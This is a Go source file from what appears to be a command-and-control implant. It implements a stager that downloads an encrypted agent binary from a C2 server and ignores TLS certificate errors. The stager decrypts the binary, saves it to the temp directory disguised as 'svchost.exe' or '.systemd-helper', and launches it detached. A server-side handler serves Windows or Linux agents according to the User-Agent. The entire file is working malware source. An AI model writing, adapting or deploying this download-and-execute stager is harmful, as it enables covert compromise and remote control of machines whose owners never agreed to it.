package implant

import (
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

// Stager is a minimal first-stage payload that downloads and executes the full agent.
// The stager is tiny (~50KB compiled) compared to the full agent (~6MB).
//
// Flow:
//   1. Stager runs on target
//   2. Downloads full agent from C2 server (HTTPS)
//   3. Writes to temp directory with inconspicuous name
//   4. Executes the full agent
//   5. Stager exits
//
// The C2 server serves the full agent binary at /api/v1/update

// RunStager downloads the full agent from the C2 server and executes it.
func RunStager(serverURL string) error {
	// Determine download URL
	downloadURL := serverURL + "/api/v1/update"

	// Build output path
	tmpDir := os.TempDir()
	var agentPath string
	if runtime.GOOS == "windows" {
		// Disguise as Windows service
		agentPath = filepath.Join(tmpDir, "svchost.exe")
	} else {
		// Disguise as system daemon
		agentPath = filepath.Join(tmpDir, ".systemd-helper")
	}

	// Download the agent binary
	client := &http.Client{
		Timeout: 120 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Generate a 16-byte random challenge for per-request key derivation
	challenge := make([]byte, 16)
	if _, err := rand.Read(challenge); err != nil {
		return fmt.Errorf("generate challenge: %w", err)
	}
	hexChallenge := hex.EncodeToString(challenge)

	req, err := http.NewRequest("GET", downloadURL, nil)
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("X-Client-Token", hexChallenge)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("download agent: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("server returned %d", resp.StatusCode)
	}

	// Read the agent binary
	agentBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50<<20)) // 50MB max
	if err != nil {
		return fmt.Errorf("read agent: %w", err)
	}

	// XOR-decrypt using SHA-256(challenge) as the derived key
	derived := sha256.Sum256(challenge)
	for i := range agentBytes {
		agentBytes[i] ^= derived[i%32]
	}

	// Write to disk
	if err := os.WriteFile(agentPath, agentBytes, 0755); err != nil {
		return fmt.Errorf("write agent: %w", err)
	}

	// Execute the agent
	cmd := exec.Command(agentPath)
	cmd.Start()

	// Don't wait — let the agent run independently
	return nil
}

// StagingHandler serves the full agent binary to stagers.
// This is added as a route on the HTTP listener.
type StagingHandler struct {
	WindowsAgent []byte
	LinuxAgent   []byte
}

// ServeAgent returns the appropriate agent binary based on User-Agent.
func (sh *StagingHandler) ServeAgent(userAgent string) []byte {
	// Simple heuristic: Windows UA gets Windows agent, else Linux
	if containsAny(userAgent, "Windows", "Win64", "Win32") {
		return sh.WindowsAgent
	}
	return sh.LinuxAgent
}

func containsAny(s string, substrs ...string) bool {
	for _, sub := range substrs {
		for i := 0; i <= len(s)-len(sub); i++ {
			if s[i:i+len(sub)] == sub {
				return true
			}
		}
	}
	return false
}

// LoadStagedAgents loads pre-built agent binaries for serving to stagers.
func LoadStagedAgents(windowsPath, linuxPath string) (*StagingHandler, error) {
	handler := &StagingHandler{}

	if windowsPath != "" {
		data, err := os.ReadFile(windowsPath)
		if err == nil {
			handler.WindowsAgent = data
		}
	}

	if linuxPath != "" {
		data, err := os.ReadFile(linuxPath)
		if err == nil {
			handler.LinuxAgent = data
		}
	}

	return handler, nil
}
